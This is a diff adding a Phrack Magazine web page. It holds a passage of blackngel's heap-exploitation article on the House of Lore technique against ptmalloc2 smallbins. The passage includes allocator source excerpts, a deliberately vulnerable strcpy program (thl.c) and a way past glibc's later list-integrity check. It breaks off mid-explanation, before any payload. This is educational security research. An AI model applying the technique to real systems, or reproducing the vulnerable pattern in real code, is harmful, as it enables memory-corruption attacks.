@@ -1,0 +1,2914 @@
+<?xml version="1.0" encoding="utf-8" ?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">
+<head>
+   <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+   <meta http-equiv="content-language" content="en" />
+   <meta name="description" content="Phrack staff website." />
+   <meta name="keywords" content="phrack" />
+   <meta name="robots" content="follow,index,all" />
+
+   <meta name="revisit-after" content="7 days" />
+   
+   <title>.:: Phrack Magazine ::.</title>
+   
+   <link href="../../css/style.css" rel="stylesheet" type="text/css">
+</head>
+<body id="top">
+<div align="center" class="texto-2-bold">
+[ <a href="../../index.html" title="News">News</a> ]
+[ <a href="../../" title="Paper Feed">Paper Feed</a> ]
+[ <a href="../../issues/71/1.html" title="Issues">Issues</a> ]
+[ <a href="../../authors.html" title="Authors">Authors</a> ]
+[ <a href="../../archives/" title="Archives">Archives</a> ]
+[ <a href="../../contact.html" title="Contact">Contact</a> ]
+
+</div>
+
+<center>
+   <br>
+   <br>
+   <img width="600" src="../../images/phrack-logo.jpg" alt="..[ Phrack Magazine ]..">
+   <br>
+
+   <div class="texto-2">
+   <div class="p-title">.:: The House Of Lore: Reloaded ptmalloc v2 &amp; v3: Analysis &amp; Corruption ::.</div>
+   <hr width="600" />
+   </div>
+   
+   <div style="padding-top: 4px; padding-bottom: 4px;">
+<div class="around">
+
+<div class="details"><strong>Issues</strong>: 
+[ <a href="../../issues/1/1.html" title="Issue 1">1</a> ] [ <a href="../../issues/2/1.html" title="Issue 2">2</a> ] [ <a href="../../issues/3/1.html" title="Issue 3">3</a> ] [ <a href="../../issues/4/1.html" title="Issue 4">4</a> ] [ <a href="../../issues/5/1.html" title="Issue 5">5</a> ] [ <a href="../../issues/6/1.html" title="Issue 6">6</a> ] [ <a href="../../issues/7/1.html" title="Issue 7">7</a> ] [ <a href="../../issues/8/1.html" title="Issue 8">8</a> ] [ <a href="../../issues/9/1.html" title="Issue 9">9</a> ] [ <a href="../../issues/10/1.html" title="Issue 10">10</a> ] [ <a href="../../issues/11/1.html" title="Issue 11">11</a> ] [ <a href="../../issues/12/1.html" title="Issue 12">12</a> ] [ <a href="../../issues/13/1.html" title="Issue 13">13</a> ] [ <a href="../../issues/14/1.html" title="Issue 14">14</a> ] [ <a href="../../issues/15/1.html" title="Issue 15">15</a> ] [ <a href="../../issues/16/1.html" title="Issue 16">16</a> ] [ <a href="../../issues/17/1.html" title="Issue 17">17</a> ] [ <a href="../../issues/18/1.html" title="Issue 18">18</a> ] [ <a href="../../issues/19/1.html" title="Issue 19">19</a> ] [ <a href="../../issues/20/1.html" title="Issue 20">20</a> ] [ <a href="../../issues/21/1.html" title="Issue 21">21</a> ] [ <a href="../../issues/22/1.html" title="Issue 22">22</a> ] [ <a href="../../issues/23/1.html" title="Issue 23">23</a> ] [ <a href="../../issues/24/1.html" title="Issue 24">24</a> ] [ <a href="../../issues/25/1.html" title="Issue 25">25</a> ] [ <a href="../../issues/26/1.html" title="Issue 26">26</a> ] [ <a href="../../issues/27/1.html" title="Issue 27">27</a> ] [ <a href="../../issues/28/1.html" title="Issue 28">28</a> ] [ <a href="../../issues/29/1.html" title="Issue 29">29</a> ] [ <a href="../../issues/30/1.html" title="Issue 30">30</a> ] [ <a href="../../issues/31/1.html" title="Issue 31">31</a> ] [ <a href="../../issues/32/1.html" title="Issue 32">32</a> ] [ <a href="../../issues/33/1.html" title="Issue 33">33</a> ] [ <a href="../../issues/34/1.html" title="Issue 34">34</a> ] [ <a href="../../issues/35/1.html" title="Issue 35">35</a> ] [ <a href="../../issues/36/1.html" title="Issue 36">36</a> ] [ <a href="../../issues/37/1.html" title="Issue 37">37</a> ] [ <a href="../../issues/38/1.html" title="Issue 38">38</a> ] [ <a href="../../issues/39/1.html" title="Issue 39">39</a> ] [ <a href="../../issues/40/1.html" title="Issue 40">40</a> ] [ <a href="../../issues/41/1.html" title="Issue 41">41</a> ] [ <a href="../../issues/42/1.html" title="Issue 42">42</a> ] [ <a href="../../issues/43/1.html" title="Issue 43">43</a> ] [ <a href="../../issues/44/1.html" title="Issue 44">44</a> ] [ <a href="../../issues/45/1.html" title="Issue 45">45</a> ] [ <a href="../../issues/46/1.html" title="Issue 46">46</a> ] [ <a href="../../issues/47/1.html" title="Issue 47">47</a> ] [ <a href="../../issues/48/1.html" title="Issue 48">48</a> ] [ <a href="../../issues/49/1.html" title="Issue 49">49</a> ] [ <a href="../../issues/50/1.html" title="Issue 50">50</a> ] [ <a href="../../issues/51/1.html" title="Issue 51">51</a> ] [ <a href="../../issues/52/1.html" title="Issue 52">52</a> ] [ <a href="../../issues/53/1.html" title="Issue 53">53</a> ] [ <a href="../../issues/54/1.html" title="Issue 54">54</a> ] [ <a href="../../issues/55/1.html" title="Issue 55">55</a> ] [ <a href="../../issues/56/1.html" title="Issue 56">56</a> ] [ <a href="../../issues/57/1.html" title="Issue 57">57</a> ] [ <a href="../../issues/58/1.html" title="Issue 58">58</a> ] [ <a href="../../issues/59/1.html" title="Issue 59">59</a> ] [ <a href="../../issues/60/1.html" title="Issue 60">60</a> ] [ <a href="../../issues/61/1.html" title="Issue 61">61</a> ] [ <a href="../../issues/62/1.html" title="Issue 62">62</a> ] [ <a href="../../issues/63/1.html" title="Issue 63">63</a> ] [ <a href="../../issues/64/1.html" title="Issue 64">64</a> ] [ <a href="../../issues/65/1.html" title="Issue 65">65</a> ] [ <a href="../../issues/66/1.html" title="Issue 66">66</a> ] [ <a class="current" href="../../issues/67/1.html" title="Issue 67">67</a> ] [ <a href="../../issues/68/1.html" title="Issue 68">68</a> ] [ <a href="../../issues/69/1.html" title="Issue 69">69</a> ] [ <a href="../../issues/70/1.html" title="Issue 70">70</a> ] [ <a href="../../issues/71/1.html" title="Issue 71">71</a> ] 
+</div>
+<div class="opt" align="center"><div class="rt"><a href="../../archives/tgz/phrack67.tar.gz" title="Get current issue tar.gz">Get tar.gz</a></div><strong>Current issue</strong> : #<a href="../../archives/tgz/phrack67.tar.gz" title="Get current issue tar.gz">67</a> | <strong>Release date</strong> : <b>2010-11-17</b> | <strong>Editor</strong> : <b>The Phrack Staff</b></div>
+
+<div style="border-top: 1px solid black; border-bottom: 2px solid black">
+<table class="tissue" cellpadding="0" cellspacing="0">
+   <tbody>
+      <tr><td align="left"><a href="../../issues/67/1.html#article">Introduction</a></td><td align="right">The Phrack Staff</td></tr>
+<tr><td align="left"><a href="../../issues/67/2.html#article">Phrack Prophile on Punk</a></td><td align="right">The Phrack Staff</td></tr>
+<tr><td align="left"><a href="../../issues/67/3.html#article">Phrack World News</a></td><td align="right">EL ZILCHO</td></tr>
+<tr><td align="left"><a href="../../issues/67/4.html#article">Loopback (is back)</a></td><td align="right">The Phrack Staff</td></tr>
+<tr><td align="left"><a href="../../issues/67/5.html#article">How to make it in Prison</a></td><td align="right">TAp</td></tr>
+<tr><td align="left"><a href="../../issues/67/6.html#article">Kernel instrumentation using kprobes</a></td><td align="right">ElfMaster</td></tr>
+<tr><td align="left"><a href="../../issues/67/7.html#article">ProFTPD with mod_sql pre-authentication, remote root</a></td><td align="right">FelineMenace</td></tr>
+<tr><td align="left"><a href="../../issues/67/8.html#article">The House Of Lore: Reloaded ptmalloc v2 &amp; v3: Analysis &amp; Corruption</a></td><td align="right">blackngel</td></tr>
+<tr><td align="left"><a href="../../issues/67/9.html#article">A Eulogy for Format Strings</a></td><td align="right">Captain Planet</td></tr>
+<tr><td align="left"><a href="../../issues/67/10.html#article">Dynamic Program Analysis and Software Exploitation</a></td><td align="right">BSDaemon</td></tr>
+<tr><td align="left"><a href="../../issues/67/11.html#article">Exploiting Memory Corruptions in Fortran Programs Under Unix/VMS</a></td><td align="right">Magma</td></tr>
+<tr><td align="left"><a href="../../issues/67/12.html#article">Phrackerz: Two Tales</a></td><td align="right">Antipeace &amp; The Analog Kid</td></tr>
+<tr><td align="left"><a href="../../issues/67/13.html#article">Scraps of notes on remote stack overflow exploitation</a></td><td align="right">pi3</td></tr>
+<tr><td align="left"><a href="../../issues/67/14.html#article">Notes Concerning The Security, Design and Administration of Siemens DCO-CS</a></td><td align="right">The Philosopher</td></tr>
+<tr><td align="left"><a href="../../issues/67/15.html#article">Hacking the mind for fun and profit</a></td><td align="right">lvxferis</td></tr>
+<tr><td align="left"><a href="../../issues/67/16.html#article">International scenes</a></td><td align="right">various</td></tr>
+
+   </tbody>
+</table>
+
+<div class="opt" id="article"><strong>Title</strong> : The House Of Lore: Reloaded ptmalloc v2 &amp; v3: Analysis &amp; Corruption</div>
+<div class="opt-bottom"> <strong>Author</strong> : blackngel</div>
+<pre>                              ==Phrack Inc.==
+
+                Volume 0x0e, Issue 0x43, Phile #0x08 of 0x10
+
+|=-----------------------------------------------------------------------=|
+|=-------------------=[ The House Of Lore: Reloaded ]=-------------------=|
+|=-------------=[ ptmalloc v2 &amp; v3: Analysis &amp; Corruption ]=-------------=|
+|=-----------------------------------------------------------------------=|
+|=--------------------------=[  by blackngel  ]=-------------------------=|
+|=-----------------------------------------------------------------------=|
+
+
+                  ^^
+              *`* @@ *`*     HACK THE WORLD
+             *   *--*   *    
+                  ##         &lt;blackngel1@gmail.com&gt;
+                  ||         &lt;black@set-ezine.org&gt;
+                 *  *
+                *    *       (C) Copyleft 2010 everybody
+               _*    *_
+
+
+--[ CONTENTS
+
+   1 - Preface
+
+   2 - Introduction
+
+     2.1 - KiddieDbg Ptmalloc2
+
+     2.2 - SmallBin Corruption
+
+         2.2.1 - Triggering The HoL(e)
+
+         2.2.2 - A More Confusing Example
+
+   3 - LargeBin Corruption Method
+
+   4 - Analysis of Ptmalloc3
+
+     4.1 - SmallBin Corruption (Reverse)
+
+     4.2 - LargeBin Method (TreeBin Corruption)
+
+     4.3 - Implement Security Checks
+
+         4.3.1 - Secure Heap Allocator (Utopian)
+
+         4.3.2 - dnmalloc
+
+         4.3.3 - OpenBSD malloc
+
+   5 - Miscellany, ASLR and More
+
+   6 - Conclusions
+
+   7 - Acknowledgments
+
+   8 - References
+
+   9 - Wargame Code
+
+--[ END OF CONTENTS
+
+
+
+           .-----------.
+---[ 1 ---[   Preface   ]---
+           .-----------.
+
+No offense, I could say that sometimes the world of hackers (at least) is 
+divided into two camps: 
+    
+    1.- The illustrious characters who spend many hours to find holes in
+    the current software.
+    
+    2.- And the hackers who spend most of their time to find a way to
+    exploit a vulnerable code/environment that does not exist yet.
+
+Maybe, it is a bit confusing but this is like the early question: which 
+came first, the chicken or the egg? Or better... Which came first, the bug 
+or the exploit?
+
+Unlike what happens with an ordinary Heap Overflow, where we could say it's
+the logical progression over time of a Stack Overflow, with The House of 
+Lore technique seems to happen something special and strange, we know it's 
+there (a thorn in your mind), that something happens, something is wrong 
+and that we can exploit it.
+
+But we do not know how to do it. And that is all over this stuff, we know
+the technique (at least the Phantasmal Phantasmagoria explanation), but
+perhaps has anyone seen a sample vulnerable code that can be exploited?
+
+Maybe someone is thinking: well, if the bug exists and it is an ordinary 
+Heap Overflow... 
+
+     1.- What are the conditions to create a new technique? 
+     
+     2.- Why a special sequence of calls to malloc( ) and free( ) allows a 
+     specific exploit technique and why another sequence needs other 
+     technique? 
+     
+     3.- What are the names of those sequences? Are the sequences a bug or 
+     is it pure luck?
+
+This can give much food for thought. If Phantasmal had left a clear 
+evidence of his theory, surely we would have forgotten about it, but as 
+this did not happened, some of us are spending all day analyzing the way to 
+create a code that can be committed with a technique that a virtual expert 
+gave us in 2005 in a magnificent article that everyone already knows, 
+right?
+
+We speak about &quot;Malloc Maleficarum&quot; [1], great theory that I myself had the 
+opportunity to demonstrate in practice in the &quot;Malloc Des-Maleficarum&quot; [2] 
+article. But unfortunately I left a job unresolved yet. In the pas I was 
+not able to interpret so correct one of the techniques that were presented 
+by Phantasmal, we speak of course of &quot;The House of Lore&quot; technique, but in
+a moment of creativity it seems that I finally found a solution.
+
+Here I submit the details of how a vulnerable code can be attacked with The
+House of Lore (THoL from now), thus completing a stage that for some reason
+was left unfinished.
+
+In addition, we will target not only the smallbin corruption method which
+many have heard of, but we also introduce the complications in largebin 
+method and how to solve them. I also present two variants based on these 
+techniques that I have found to corrupt the Ptmalloc3 structure.
+
+There are also more content in this paper like a small program where to 
+apply one of the techniques can be exploited, it is very useful for an 
+exploiting-wargame.
+
+And... yes, THoL was exactly the thorn that I had into my mind.
+
+
+
+               &lt;&lt; One can resist the invasion
+                  of an army but one cannot
+                  resist the invasion of ideas. &gt;&gt;
+
+                                   [ Victor Hugo ]
+
+
+
+           .----------------.
+---[ 2 ---[   Introduction   ]---
+           .----------------.
+
+Then, before starting with practical examples, we reintroduce the technical
+background of the THoL. While that one might take the Phantasmal's theory
+as the only support for subsequent descriptions, we will offer a bigger and
+more deep approach to the subject and also some small indications on how 
+you can get some information from Ptmalloc2 in runtime without having to 
+modify or recompile your personal GlibC.
+
+We mention that dynamic hooks could be a better way to this goal. More
+control, more conspicuous.
+
+
+
+               &lt;&lt; Great spirits have always encountered
+                  violent opposition from mediocre minds. &gt;&gt;
+
+                                         [ Albert Einstein ]
+
+
+
+             .-----------------------.
+---[ 2.1 ---[   KiddieDbg Ptmalloc2   ]---
+             .-----------------------.
+
+In an effort to make things easier to the reader when we will perform all
+subsequent tests, let's indicate the simple way you can use PTMALLOC2 to
+obtain the necessary information from within each attack.
+
+To avoid the tedious task of recompiling GLIBC when one makes a minor 
+change in &quot;malloc.c&quot;, we decided to directly download the sources of 
+ptmalloc2 from: http://www.malloc.de/malloc/ptmalloc2-current.tar.gz.
+
+Then we compiled it in a Kubuntu 9.10 Linux distribution (it will not be a 
+great effort to type a make) and you can directly link it as a static 
+library to each of our examples like this:
+
+   gcc prog.c libmalloc.a -o prog
+
+However, before compiling this library, we allowed ourselves the luxury of 
+introducing a pair of debugging sentences. To achieve this we made use of a
+function that is not accessible to everybody, one has to be very eleet to 
+know it and only those who have been able to escape to Matrix have the 
+right to use it. This lethal weapon is known among the gurus as 
+&quot;printf( )&quot;.
+
+And now, enough jokes, here are the small changes in &quot;malloc.c&quot; to get some 
+information at runtime:
+
+
+----- snip -----
+
+Void_t*
+_int_malloc(mstate av, size_t bytes)
+{
+....
+  checked_request2size(bytes, nb);
+
+  if ((unsigned long)(nb) &lt;= (unsigned long)(av-&gt;max_fast)) {
+    ...
+  }
+
+  if (in_smallbin_range(nb)) {
+    idx = smallbin_index(nb);
+    bin = bin_at(av,idx);
+    if ( (victim = last(bin)) != bin) {
+
+printf(&quot;\n[PTMALLOC2] -&gt; (Smallbin code reached)&quot;);
+printf(&quot;\n[PTMALLOC2] -&gt; (victim = [ %p ])&quot;, victim);
+
+      if (victim == 0) /* initialization check */
+        malloc_consolidate(av);
+      else {
+        bck = victim-&gt;bk;
+
+printf(&quot;\n[PTMALLOC2] -&gt; (victim-&gt;bk = [ %p ])\n&quot;, bck);
+
+        set_inuse_bit_at_offset(victim, nb);
+        bin-&gt;bk = bck;
+        bck-&gt;fd = bin;
+
+        if (av != &amp;main_arena)
+	  victim-&gt;size |= NON_MAIN_ARENA;
+        check_malloced_chunk(av, victim, nb);
+        return chunk2mem(victim);
+      }
+    }
+  }
+
+----- snip -----
+
+
+Here we can know when a chunk is extracted from its corresponding bin to
+satisfy a memory request of appropriate size. In addition, we can control
+the pointer value that takes the &quot;bk&quot; pointer of a chunk if it has been
+previously altered.
+
+
+----- snip -----
+
+  use_top:
+    victim = av-&gt;top;
+    size = chunksize(victim);
+
+    if ((unsigned long)(size) &gt;= (unsigned long)(nb + MINSIZE)) {
+      ........
+printf(&quot;\n[PTMALLOC2] -&gt; (Chunk from TOP)&quot;);
+      return chunk2mem(victim);
+    }
+
+----- snip -----
+
+
+Here you simply provide a warning to be aware of when a memory request is
+served from the Wilderness chunk (av-&gt;top).
+
+
+----- snip -----
+
+        bck = unsorted_chunks(av);
+        fwd = bck-&gt;fd;
+        p-&gt;bk = bck;
+        p-&gt;fd = fwd;
+        bck-&gt;fd = p;
+        fwd-&gt;bk = p;
+printf(&quot;\n[PTMALLOC2] -&gt; (Freed and unsorted chunk [ %p ])&quot;, p);
+
+----- snip -----
+
+
+Unlike the first two changes which were introduced in the &quot;_int_malloc( )&quot;
+function, the latter did it in &quot;_int_free( )&quot; and clearly indicates when a 
+chunk has been freed and introduced into the unsorted bin for a further use
+of it.
+
+
+
+               &lt;&lt; I have never met a man so
+                  ignorant that I couldn't
+                  learn something from him. &gt;&gt;
+
+                           [ Galileo Galilei ]
+
+
+
+             .-----------------------.
+---[ 2.2 ---[   SmallBin Corruption   ]---
+             .-----------------------.
+
+Take again before starting the piece of code that will trigger the 
+vulnerability described in this paper:
+
+
+----- snip ----- 
+
+  if (in_smallbin_range(nb)) {
+    idx = smallbin_index(nb);
+    bin = bin_at(av,idx);
+    if ( (victim = last(bin)) != bin) {
+
+      if (victim == 0) /* initialization check */
+        malloc_consolidate(av);
+      else {
+        bck = victim-&gt;bk;
+        set_inuse_bit_at_offset(victim, nb);
+        bin-&gt;bk = bck;
+        bck-&gt;fd = bin;
+
+        if (av != &amp;main_arena)
+	  victim-&gt;size |= NON_MAIN_ARENA;
+        check_malloced_chunk(av, victim, nb);
+        return chunk2mem(victim);
+      }
+
+----- snip ----- 
+
+
+To reach this area of the code inside &quot;_int_malloc( )&quot;, one assumes the 
+fact that the size of memory request is largest that the current value of 
+&quot;av-&gt;max_fast&quot; in order to pass the first check and avoid fastbin[ ] 
+utilization. Remember that this value is &quot;72&quot; by default.
+
+This done, then comes the function &quot;in_smallbin_range(nb)&quot; which checks in 
+turn if the chunk of memory requested is less than that MIN_LARGE_SIZE, 
+defined to 512 bytes in malloc.c.
+
+We know from the documentation that: &quot;the size bins for less than 512 bytes
+contain always the same size chunks&quot;. With this we know that if a chunk of
+a certain size has been introduced in its corresponding bin, a further
+request of the same size will find the appropriate bin and will return the
+previously stored chunk. The functions &quot;smallbin_index(nb)&quot; and 
+&quot;bin_at(av, idx)&quot; are responsible for finding the appropriate bin for the
+chunk requested.
+
+We also know that a &quot;bin&quot; is a couple of pointers &quot;fd&quot; and &quot;bk&quot;, the 
+purpose of the pointers is to close the doubly linked list of the free 
+chunks. The macro &quot;last(bin)&quot; returns the pointer &quot;bk&quot; of this &quot;fake 
+chunk&quot;, it also indicates the last available chunk in the bin (if any). If 
+none exists, the pointer &quot;bin-&gt;bk&quot; would be pointing to itself, then it 
+will fail the search and it would be out of the smallbin code.
+
+If there is an available chunk of adequate size, the process is simple. 
+Before being returned to the caller, it must be unlinked from the list and,
+in order to do it, malloc uses the following instructions:
+
+
+   1) bck = victim-&gt;bk; // bck points to the penultimate chunk
+
+   2) bin-&gt;bk = bck;    // bck becomes the last chunk
+
+   3) bck-&gt;fd = bin;    // fd pointer of the new last chunk points
+                           to the bin to close the list again
+
+
+If all is correct, the user is given the pointer *mem of victim by the 
+macro &quot;chunk2mem(victim).&quot;
+
+The only extra tasks in this process are to set the PREV_INUSE bit of the
+contiguous chunk, and also to manage the NON_MAIN_ARENA bit if victim is 
+not in the main arena by default.
+
+And here is where the game starts.
+
+The only value that someone can control in this whole process is obviously 
+the value of &quot;victim-&gt;bk&quot;. But to accomplish this, a necessary condition 
+must be satisfied:
+
+   1 - That two chunks have been allocated previously, that the latter has
+       been freed and that the first will be vulnerable to an overflow.
+
+If this is true, the overflow of the first chunk will allow to manipulate
+the header of the already freed second chunk, specifically the &quot;bk&quot; pointer
+because other fields are not interesting at this time. Always remember that
+the overflow must always occur after the release of this second piece, and
+I insist on it because we do not want to blow the alarms within 
+&quot;_int_free()&quot; before its time.
+
+As mentioned, if this manipulated second piece is introduced in its 
+corresponding bin and a new request of the same size is performed, the 
+smallbin code is triggered, and therefore come to the code that interests 
+us.
+
+&quot;bck&quot; is pointing to the altered &quot;bk&quot; pointer of victim and as a result, 
+will become the last piece in &quot;bin-&gt;bk = bck&quot;. Then a subsequent call to 
+malloc( ) with the same size could deliver a chunk in the position of 
+memory with which we had altered the &quot;bk&quot; pointer, and if this were in the 
+stack we already know what happens.
+
+In this attack one must be careful with the sentence &quot;bck-&gt;fd = bin&quot; since 
+this code tries to write to the pointer &quot;fd&quot; the bin's address to close the
+linked list, this memory area must have writing permissions.
+
+The only last thing really important for the success of our attack:
+
+When a chunk is freed, it is inserted into the known &quot;unsorted bin&quot;. This
+is a special bin, also a doubly linked list, with the peculiarity that the
+chunks are not sorted (obviously) according to the size. This bin is like a
+stack, the chunks are placed in this bin when they are freed and the chunks 
+will always been inserted in the first position.
+
+This is done with the intention that a subsequent call to &quot;malloc( ),
+calloc( ) or realloc( )&quot; can make use of this chunk if its size can fulfill
+the request. This is done to improve efficiency in the memory allocation 
+process as each chunk introduced in the unsorted bin has a chance to be 
+reused immediately without going through the sorting algorithm.
+
+How does this process work?
+
+All begins within &quot;_int_malloc( )&quot; with the next loop:
+
+   while ( (victim = unsorted_chunks(av)-&gt;bk) != unsorted_chunks(av))
+
+then takes the second last piece of the list:
+
+   bck = victim-&gt;bk
+
+checks if the memory request is within &quot;in_smallbin_range( )&quot;, and it is
+checked whether the request could be met with victim. Otherwise, proceed to
+remove victim from unsorted bin with:
+
+
+  unsorted_chunks(av)-&gt;bk = bck;
+  bck-&gt;fd = unsorted_chunks(av);
+
+
+which is the same as saying: the bin points to the penultimate chunk, and
+the penultimate chunk points to the bin which becomes the latest chunk in
+the list.
+
+Once removed from the list, two things can happen. Either the size of the
+removed chunk matches with the request made (size == nb) in which case it
+returns the memory for this chunk to the user, or it does not coincide and 
+that's when we proceed to introduce the chunk in the adequate bin with:
+
+
+   bck = bin_at(av, victim_index);
+   fwd = bck-&gt;fd;
+   .....
+   .....
+   victim-&gt;bk = bck;
+   victim-&gt;fd = fwd;
+   fwd-&gt;bk = victim;
+   bck-&gt;fd = victim;
+
+
+Why do we mention this? Well, the condition that we mentioned requires that
+the freed and manipulated chunk will be introduced in its appropriate bin, 
+since as Phantasmal said, altering an unsorted chunk is not interesting at
+this time.
+
+With this in mind, our vulnerable program should call malloc( ) between the
+vulnerable copy function and the subsequent call to malloc( ) requesting 
+the same size as the chunk recently freed. In addition, this intermediate 
+call to malloc( ) should request a size larger than the released one, so 
+that the request can not be served from unsorted list of chunks and 
+proceeds to order the pieces into their respective bins.
+
+We note before completing this section that a bin of a real-life 
+application might contain several chunks of the same size stored and 
+waiting to be used. When a chunk comes from unsorted bin, that is inserted 
+into its appropriate bin as the first in the list, and according to our 
+theory, our altered chunk is not being used until it occupies the last 
+position (last(bin)). If this occurs, multiple calls to malloc( ) with the 
+same size must be triggered so that our chunk reaches the desired position 
+in the circular list. At that point, the &quot;bk&quot; pointer must be hacked.
+
+Graphically would pass through these stages:
+
+Stage 1: Insert victim into smallbin[ ].
+
+
+                   bin-&gt;bk  ___  bin-&gt;fwd
+                  o--------[bin]----------o
+                  !         ^ ^           !
+               [last]-------| |-------[victim]
+                 ^|   l-&gt;fwd    v-&gt;bk    ^|
+                 |!                      |!
+               [....]                  [....]
+                   \\                  //
+                    [....]        [....]
+                     ^ |____________^ |
+                     |________________|    
+
+
+Stage 2: &quot;n&quot; calls to malloc( ) with same size.
+
+
+                   bin-&gt;bk  ___  bin-&gt;fwd
+                  o--------[bin]----------o
+                  !         ^ ^           !
+              [victim]------| |--------[first]
+                 ^|   v-&gt;fwd    f-&gt;bk    ^|
+                 |!                      |!
+               [....]                  [....]
+                   \\                  //
+                    [....]        [....]
+                     ^ |____________^ |
+                     |________________|    
+
+
+Stage 3: Overwrite &quot;bk&quot; pointer of victim.
+
+
+                   bin-&gt;bk  ___  bin-&gt;fwd
+                  o--------[bin]----------o
+ &amp; stack          !         ^ ^           !
+     ^--------[victim]------| |--------[first]
+        v-&gt;bk     ^   v-&gt;fwd    f-&gt;bk    ^|
+                  |                      |!
+               [....]                  [....]
+                   \\                  //
+                    [....]        [....]
+                     ^ |____________^ |
+                     |________________|  
+
+
+Stage 4: Last call to malloc( ) with same size.
+
+
+                   bin-&gt;bk  ___  bin-&gt;fwd
+                  o--------[bin]----------o
+ &amp; -w- perm       !         ^ ^           !
+     ^--------[&amp;stack]------| |--------[first]
+        v-&gt;bk     ^   v-&gt;fwd    f-&gt;bk    ^|
+                  |                      |!
+               [....]                  [....]
+                   \\                  //
+                    [....]        [....]
+                     ^ |____________^ |
+                     |________________|  
+
+
+It is where the pointer &quot;*mem&quot; is returned pointing to the stack and thus 
+giving full control of the attacked system. However as there are people who
+need to see to believe, read on next section.
+
+Note: I have not checked all versions of glibc, and some changes have been
+made since I wrote this paper. For example, on an Ubuntu box (with glibc
+2.11.1) we see the next fix:
+
+
+----- snip -----
+
+        bck = victim-&gt;bk;
+        if (__builtin_expect (bck-&gt;fd != victim, 0))
+          {
+            errstr = &quot;malloc(): smallbin double linked list corrupted&quot;;
+            goto errout;
+          }
+        set_inuse_bit_at_offset(victim, nb);
+        bin-&gt;bk = bck;
+        bck-&gt;fd = bin;
+
+----- snip -----
+
+
+This check can still be overcome if you control an area into the stack and
+you can write an integer such that its value is equal to the address of the
+recently free chunk (victim). This must happen before the next call to
+malloc( ) with the same size requested.
+
+
+
+               &lt;&lt; The grand aim of all science is to cover
+                  the greatest number of empirical facts
+                  by logical deduction from the smallest
+                  number of hypotheses or axioms. &gt;&gt;
+
+                                       [ Albert Einstein ]
+
+
+
+               .-------------------------.
+---[ 2.2.1 ---[   Triggering The HoL(e)   ]---
+               .-------------------------.
+
+After the theory... A practical example to apply this technique, here is a 
+detailed description:
+
+
+---[ thl.c ]---
+
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+
+void evil_func(void)
+{
+    printf(&quot;\nThis is an evil function. You become a cool \
+hacker if you are able to execute it.\n&quot;); 
+}
+
+void func1(void)
+{
+    char *lb1, *lb2;
+     
+    lb1 = (char *) malloc(128);
+    printf(&quot;LB1 -&gt; [ %p ]&quot;, lb1);
+    lb2 = (char *) malloc(128);
+    printf(&quot;\nLB2 -&gt; [ %p ]&quot;, lb2);
+
+    strcpy(lb1, &quot;Which is your favourite hobby? &quot;);
+    printf(&quot;\n%s&quot;, lb1);
+    fgets(lb2, 128, stdin);
+}
+
+int main(int argc, char *argv[])
+{
+    char *buff1, *buff2, *buff3;
+
+    malloc(4056);
+    buff1 = (char *) malloc(16);
+    printf(&quot;\nBuff1 -&gt; [ %p ]&quot;, buff1);
+    buff2 = (char *) malloc(128);
+    printf(&quot;\nBuff2 -&gt; [ %p ]&quot;, buff2);
+    buff3 = (char *) malloc(256);
+    printf(&quot;\nBuff3 -&gt; [ %p ]\n&quot;, buff3);
+
+    free(buff2);
+
+    printf(&quot;\nBuff4 -&gt; [ %p ]\n&quot;, malloc(1423));
+
+    strcpy(buff1, argv[1]);
+
+    func1();
+
+    return 0;
+}
+
+---[ end thl.c ]---
+
+
+The program is very simple, we have a buffer overflow in &quot;buff1&quot; and an
+&quot;evil_func( )&quot; function which is never called but which we want to run.
+
+In short we have everything we need in order to trigger THoL:
+
+1) Make a first call to malloc(4056), it shouldn't be necessary but we use 
+   to warm up the system. Furthermore, in a real-life application the heap 
+   probably won't be starting from scratch.
+
+2) We allocate three chunks of memory, 16, 128 and 256 bytes respectively,
+   since no chunks has been released before, we know that they must been 
+   taken from the Wilderness or Top Chunk.
+
+3) Free() the second chunk of 128 bytes. This is placed in the unsorted 
+   bin.
+
+4) Allocate a fourth piece larger than the most recently freed chunk. The
+   &quot;buff2&quot; is now extracted from the unsorted list and added to its 
+   appropriate bin.
+
+5) We have a vulnerable function strcpy( ) that can overwrite the header
+   of the chunk previously passed to free( ) (including its &quot;bk&quot; field).
+
+6) We call func1( ) which allocated two blocks of 128 bytes (the same size
+   as the piece previously released) to formulate a question and get a user
+   response.
+
+It seems that in point 6 there is nothing vulnerable, but everyone knows
+that if &quot;LB2&quot; point to the stack, then we may overwrite a saved return
+address. That is our goal, and we will see this approach.
+
+A basic execution could be like this:
+
+black@odisea:~/ptmalloc2$ ./thl AAAA
+
+[PTMALLOC2] -&gt; (Chunk from TOP)
+Buff1 -&gt; [ 0x804ffe8 ]
+[PTMALLOC2] -&gt; (Chunk from TOP)
+Buff2 -&gt; [ 0x8050000 ]
+[PTMALLOC2] -&gt; (Chunk from TOP)
+Buff3 -&gt; [ 0x8050088 ]
+
+[PTMALLOC2] -&gt; (Freed and unsorted chunk [ 0x804fff8 ])
+[PTMALLOC2] -&gt; (Chunk from TOP)
+Buff4 -&gt; [ 0x8050190 ]
+
+[PTMALLOC2] -&gt; (Smallbin code reached)
+[PTMALLOC2] -&gt; (victim = [ 0x804fff8 ])
+[PTMALLOC2] -&gt; (victim-&gt;bk = [ 0x804e188 ])
+LB1 -&gt; [ 0x8050000 ]
+[PTMALLOC2] -&gt; (Chunk from TOP)
+LB2 -&gt; [ 0x8050728 ]
+Which is your favourite hobby: hack
+black@odisea:~/ptmalloc2$
+
+
+We can see that the first 3 malloced chunks are taken from the TOP, then 
+the second chunk (0x0804fff8) is passed to free() and placed in the 
+unsorted bin. This piece will remain here until the next call to malloc( ) 
+will indicate whether it can meet the demand or not.
+
+Since the allocated fourth buffer is larger than the recently freed, it's 
+taken again from TOP, and buff2 is extracted from unsorted bin to insert it
+into the bin corresponding to its size (128).
+
+After we see how the next call to malloc(128) (lb1) triggers smallbin code 
+returning the same address that the buffer previously freed. You can see 
+the value of &quot;victim-&gt;bk&quot; which is what should take (lb2) after this 
+address had been passed to the chunk2mem( ) macro.
+
+However, we can see in the output: the lb2 is taken from the TOP and not
+from a smallbin. Why? Simple, we've just released a chunk (only had a piece
+in the corresponding bin to the size of this piece) and since we have not 
+altered the &quot;bk&quot; pointer of the piece released, the next check:
+
+
